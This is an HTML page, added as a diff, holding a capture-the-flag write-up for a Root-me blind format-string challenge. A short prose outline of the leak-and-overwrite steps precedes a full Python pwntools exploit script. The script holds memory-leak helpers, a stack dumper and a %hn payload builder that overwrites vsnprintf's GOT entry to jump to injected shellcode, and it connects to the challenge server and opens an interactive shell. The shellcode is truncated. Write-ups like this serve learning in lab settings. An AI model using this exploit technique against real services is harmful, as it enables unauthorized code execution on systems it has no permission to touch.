@@ -1,0 +1,183 @@
+<html>
+ <head>
+<title> Root-me </title>
+
+ <link rel="stylesheet" type="text/css" href="test1.css" />
+ <link rel="stylesheet" type="text/css" href="fonts.css" />
+</head>
+<style>
+
+      body {background-color:white;
+	border-bottom:1px solid #bfbfbf
+         line-height:1.5em;
+	color:#222}
+ 
+   p{color:black;
+        /*font-style: italic;
+       font-family: "Times New Roman";*/
+      letter-spacing: 2px;
+       font-size: 20px;
+       margin-top: 10px;
+       margin-bottom: 10px;
+        margin-right: 150px;
+       margin-left: 150px; 
+       }
+
+
+
+    h1{ color:black;
+         font-style: italic;
+        font-size:2.2em;
+	font-family:"PT Serif","Georgia","Helvetica Neue",Arial,sans-serif;
+	font-weight:normal;
+	line-height:1.2em;
+	margin-bottom:0.6667em
+        margin-right: 150px;
+       margin-left: 150px;}
+
+code { 
+display: block; white-space: pre-wrap; 
+border: 1px solid #000; 
+padding: 10px; 
+line-height: 1.5em; 
+font-family: "Lucida Console", Monaco, monospace; 
+} 
+.code-str 
+{ color:#ff33d4; } 
+ .code-comment { color:#3c33ff; } 
+ .code-key { color:#9933ff; }
+ .code-brown{color:#ba4a00} 
+
+
+</style>
+<body>
+
+<script src="null.js"></script>
+
+<div style="position: relative; background: url('http://hackerbuck.net23.net/css/bgm.png'); width: 1210px; height: 110px;">
+ <div style="position: absolute; bottom: 0; left: 0.5em; width: 400px; font-weight: bold; color: #fff;">
+ <p style="color:white;font-size:2.2em;"> Unblind me ! </p>
+ </div>
+ </div>
+
+
+ <br> <br>  <br>          
+
+<h1 class="post-title"> Blind Format string  </h1>
+   
+ <br> 
+
+<p>
+After a very very  long time  finally got my exploit working ... 
+This problem was pretty difficult , learned a lot though  <br><br>
+There was no binary given a pure blind attack . So after reading few writeup got to know about <b>Dynelf</b> in pwntools which could help in dumping <b>code,got_table,libc</b><br><br>
+1) dump the code ( didn't understand anything ) by guessing the start addr which is constant <b>0x8048000</b><br><br>
+2) dump the libc and got match it and reslove the function <br><br>
+3) tried got overwrite (this should have been last step if there was printf) but no function in which i could control 1'st argument :( <br><br>
+4) now dump the stack to find where passwd is stored (by dumping all values starting from <b>0xbfff000</b>) <br><br>
+5) place the shellcode there and overwrite vsnprintf got addr with addr of shellcode <br> <br>
+finally got the shell 
+</p>
+
+<code>
+from pwn import *
+from frmstr import *
+import binascii
+import sys
+
+def leak(s,offset,pad,address):
+  data = "%"+str(offset)+"$pBBBB" + pack(address,'all')
+  if "\n" in data:
+    print " [!] newline in payload!"
+    return ""
+  try:
+    s.sendline("%"+str(offset)+"$s"+"A"*pad + pack(address,'all'))
+  except EOFError:
+    raise EOFError
+  try:
+    data = s.recv()
+    print "[R] leaked %d bytes at %x " % (len(data.split("A"*pad)[0]),address)
+  except EOFError:
+    print "[X] EOFError trying to leak from %x" % address
+    
+    return None
+  (code,junk) = data.split("A"*pad)
+  return code
+
+def leak_code(s,l_offset,l_pad,address,size):
+  global offset
+  global pad
+  dump=open('test','w')
+  offset = l_offset 
+  pad = l_pad
+  remainingSize = size
+  while remainingSize > 0:
+    try:
+      data = leak(s,offset,pad,address + size - remainingSize)
+      remainingSize -=  1
+    except EOFError:
+      return out
+    if len(data) ==  0:
+      dump.write("[+]"+hex(address + size - remainingSize)+" : "+data+"\n")
+    else:
+      context.bits = len(data)*8
+      data = hex(unpack(data))
+      print "[+]"+hex(address + size - remainingSize)+" : "+data+"\n"
+      dump.write("[+]"+hex(address + size - remainingSize)+" : "+data+"\n")
+      remainingSize -= len(data) + 1
+
+def leakstack(r,start,end,writes):
+   dump=open('stack_val','w')
+   for i in range(start,end):
+     try :
+       payload="%"+str(i)+"$"+writes
+       r.sendline(payload)
+       msg=r.recvline()
+       print "[+] trying with index"+str(i)+" "+msg
+       dump.write(str(i)+" : "+msg+"\n")
+     except EOFError :
+       print "[+] no luck here !!"
+       i=i+1
+
+def send_rev_payload(r,dest,data,offset):
+   data_off_l = data & 0xFFFF
+   data_off_u = (data >> 16) & 0xFFFF
+   num1 = data_off_u - 8
+   num2 =  data_off_l - data_off_u
+   print "[+] Data_high = %x , Data_low = %x " %(data_off_u, data_off_l)
+   payload = pack(dest)+pack(dest+2)+"%"+str(num1)+"u"+"%"+str(offset+1)+"$hn"+"%"+str(num2)+"u"+"%"+str(offset)+"$hn"
+   print "[+] payload = "+repr(payload)
+   r.sendline(payload)
+
+
+offset = 0
+pad = 0	
+base_addr = 0x8048000
+r=remote('challenge02.root-me.org',56003)
+saveSocket = r
+shellcode = "\x6a\x02\x5b\x6a\x29\x58\xcd........"
+
+msg=r.recvuntil(':')
+print msg
+r.sendline('root')
+msg=r.recvuntil(':')
+print msg
+r.sendline(shellcode)
+msg=r.recvline()
+print msg
+
+vsnprintf_got = 0x804a020
+shellcode_addr = 0xbffff92c
+
+#leakstack(r,500,700,'p')
+#leak_code(r,263,2,0xbffff92c,32)
+
+send_rev_payload(r,vsnprintf_got,shellcode_addr,261)
+r.sendline('JUNK')
+r.interactive()
+
+</code>
+
+
+</body>
+</html>
